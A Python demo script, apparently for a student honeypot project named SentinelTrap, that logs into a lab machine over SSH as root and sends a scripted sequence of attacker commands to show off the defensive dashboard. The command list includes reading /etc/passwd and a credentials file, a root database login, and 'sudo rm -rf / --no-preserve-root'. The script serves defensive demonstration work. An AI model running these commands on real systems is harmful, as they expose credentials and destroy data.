#!/usr/bin/env python3
"""
SentinelTrap - Automated Live Attack Demonstration Script
Run this script on Machine 2 (Kali Linux or Laptop 2).
It connects to Machine 1 (192.168.1.4) via real SSH and simulates an authentic attack.
"""

import sys
import time

try:
    import paramiko
except ImportError:
    print("[-] Paramiko library not found.")
    print("[*] Install it by running: pip install paramiko")
    sys.exit(1)

# Target Machine 1 (Your Defense Laptop)
TARGET_IP = "192.168.1.4"
TARGET_PORT = 2222
USERNAME = "root"
PASSWORD = "password123"

def run_attack():
    print("=" * 65)
    print("🛡️  SENTINELTRAP - ADVERSARIAL ATTACK DEMONSTRATION")
    print(f"Target Defense Node: {TARGET_IP}:{TARGET_PORT}")
    print("=" * 65)

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    print(f"\n[+] Step 1: Performing SSH brute-force credential login...")
    print(f"    Target: {TARGET_IP}:{TARGET_PORT} | User: '{USERNAME}' | Pass: '{PASSWORD}'")
    
    try:
        client.connect(
            hostname=TARGET_IP,
            port=TARGET_PORT,
            username=USERNAME,
            password=PASSWORD,
            timeout=8,
            allow_agent=False,
            look_for_keys=False
        )
        print("[✓] Login SUCCESSFUL! Adversary gained interactive root shell.")
        print(">>> Look at Machine 1 Dashboard: A new active session just appeared!")
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        print("[!] Ensure 'python run_all.py' is running on Machine 1 (192.168.1.4)")
        return

    # Open interactive shell channel
    chan = client.invoke_shell()
    time.sleep(1)

    # Flush welcome banner
    if chan.recv_ready():
        banner = chan.recv(2048).decode('utf-8', errors='ignore')
        print(banner.strip())

    # Sequence of adversarial commands
    attack_commands = [
        ("whoami", "Privilege verification"),
        ("uname -a", "Kernel / OS architecture reconnaissance"),
        ("cat /etc/passwd", "Credential harvesting (Triggers Adaptive Deception)"),
        ("ls -la /var/backups", "Sensitive directory reconnaissance"),
        ("cat /var/backups/credentials.txt", "Exfiltrating AWS keys (Triggers CANARY TRIPWIRE!)"),
        ("mysql -u root -p", "Internal database pivoting attempt"),
        ("sudo rm -rf / --no-preserve-root", "Destructive sabotage payload (Proving VFS Isolation)"),
        ("exit", "Disconnecting session")
    ]

    print("\n[+] Step 2: Executing real-time adversarial commands...")
    for cmd, purpose in attack_commands:
        print("\n" + "-" * 55)
        print(f"[*] Attacker Action : {purpose}")
        print(f"[*] Executing CLI   : > {cmd}")
        print("-" * 55)

        chan.send(cmd + "\n")
        time.sleep(2)  # Typing pause so teacher sees real-time dashboard updates

        # Read and display response
        output = ""
        while chan.recv_ready():
            chunk = chan.recv(4096).decode('utf-8', errors='ignore')
            output += chunk
            time.sleep(0.1)

        lines = [l for l in output.splitlines() if l.strip() and not l.startswith(cmd)]
        for line in lines[:8]:
            print(f"    {line}")
        if len(lines) > 8:
            print("    ...")

    client.close()
    print("\n" + "=" * 65)
    print("🎉 Attack completed successfully!")
    print("Now switch to Machine 1 Dashboard to show:")
    print(" 1. Keystroke Stream & Terminal Replay")
    print(" 2. Auto-generated PDF Forensic Incident Report")
    print(" 3. AutoShun IP Firewall Blocking Rule")
    print("=" * 65)

if __name__ == "__main__":
    run_attack()
